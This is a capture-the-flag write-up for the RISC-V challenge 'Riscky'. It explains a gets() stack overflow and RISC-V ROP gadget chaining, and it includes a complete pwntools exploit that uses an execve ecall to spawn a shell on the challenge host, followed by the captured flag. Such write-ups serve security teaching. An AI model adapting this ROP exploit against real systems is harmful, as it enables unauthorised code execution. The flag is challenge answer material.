# Riscky

## Challenge

We are given a 64-bit, statically-linked RISC-V binary.

## Solution

There is an unsafe call to `gets()` which we can use to overflow the stack buffer and overwrite the return address.

The challenge comes from the fact that many tools don't work on RISC-V, such as ROPGadget.

RISC-V uses the RA register to store return addresses.
This makes it more difficult to chain ROP gadgets as we all need gadgets to set RA.

In our case, we will use 2 gadgets to execute jumps.
One gadget will set the saved registers and return into the next gadget, which will use the saved registers to set up RA and jump to our target function.
We can use this to read `"/bin/sh"` into data at a known address.

Next, we return back into our ropchain, where set up an ecall to spawn a shell using the stored string.

## Exploit

```py
#!/usr/bin/env python3
from pwn import *

exe = ELF('riscky')
context.update(arch="riscv", os="linux", bits = 64, endianness = 'little')

host = args.HOST or 'challenge.nahamcon.com'
port = int(args.PORT or 32267)

def start_local(argv=[], *a, **kw):
    '''Execute the target binary locally'''
    if args.GDB:
        return process(['qemu-riscv64', '-g', '1337', exe.path] + argv, *a, **kw)
    else:
        return process(['qemu-riscv64', exe.path] + argv, *a, **kw)

def start_remote(argv=[], *a, **kw):
    '''Connect to the process on the remote host'''
    io = connect(host, port)
    return io

def start(argv=[], *a, **kw):
    '''Start the exploit against the target.'''
    if args.LOCAL:
        return start_local(argv, *a, **kw)
    else:
        return start_remote(argv, *a, **kw)

#===========================================================
#                    EXPLOIT GOES HERE
#===========================================================

"""
   1357a:   70ea                    ld  ra,184(sp)
   1357c:   744a                    ld  s0,176(sp)
   1357e:   74aa                    ld  s1,168(sp)
   13580:   790a                    ld  s2,160(sp)   
   13582:   69ea                    ld  s3,152(sp)
   13584:   6a4a                    ld  s4,144(sp)
   13586:   6aaa                    ld  s5,136(sp)
   13588:   6b0a                    ld  s6,128(sp)  
   1358a:   7c46                    ld  s8,112(sp)
   1358c:   7ca6                    ld  s9,104(sp)
   1358e:   7d06                    ld  s10,96(sp)
   13590:   6de6                    ld  s11,88(sp)
   13592:   855e                    mv  a0,s7
   13594:   7be6                    ld  s7,120(sp)
   13596:   6129                    addi    sp,sp,192
   13598:   8082                    ret
"""

"""
   2a4bc:	78a2                	ld	a7,40(sp)
   2a4be:	6802                	ld	a6,0(sp)
   2a4c0:	75e2                	ld	a1,56(sp)
   2a4c2:	7542                	ld	a0,48(sp)
   2a4c4:	70ea                	ld	ra,184(sp)
   2a4c6:	74aa                	ld	s1,168(sp)
   2a4c8:	790a                	ld	s2,160(sp)
   2a4ca:	69ea                	ld	s3,152(sp)
   2a4cc:	6a4a                	ld	s4,144(sp)
   2a4ce:	6aaa                	ld	s5,136(sp)
   2a4d0:	7be6                	ld	s7,120(sp)
   2a4d2:	7c46                	ld	s8,112(sp)
   2a4d4:	7d06                	ld	s10,96(sp)
   2a4d6:	6de6                	ld	s11,88(sp)
   2a4d8:	87da                	mv	a5,s6
   2a4da:	8366                	mv	t1,s9
   2a4dc:	6b0a                	ld	s6,128(sp)
   2a4de:	7ca6                	ld	s9,104(sp)
   2a4e0:	4701                	li	a4,0
   2a4e2:	4681                	li	a3,0
   2a4e4:	4601                	li	a2,0
   2a4e6:	6129                	addi	sp,sp,192
   2a4e8:	8302                	jr	t1
"""

"""
   10446:   00000073            ecall
"""

setsaved_gadget = 0x1357a
setargs_gadget = 0x2a4bc
ecall = 0x10446

io = start()

ropchain = flat([
        setsaved_gadget,
        flat({
            184: setargs_gadget,
            104: exe.sym['gets'],
        }, length=192, filler=b'\0'),
        flat({
            48: exe.sym['data_start'],
            184: setsaved_gadget,
        }, length=192, filler=b'\0'),
        flat({
            184: setargs_gadget,
            104: ecall,
        }, length=192, filler=b'\0'),
        flat({
            40: 221,
            56: 0,
            48: exe.sym['data_start'],
        }, length=192, filler=b'\0'),
    ])

[print(hex(unpack(ropchain[i:i+8]))[2:]) for i in range(0, len(ropchain), 8)]

io.sendlineafter(b"> ", flat({ 512: ropchain }))
io.sendline(b"/bin/sh")

io.interactive()
```

## Flag

```
flag{834e1b43c9cdfab13d9352fc949cec7b}
```
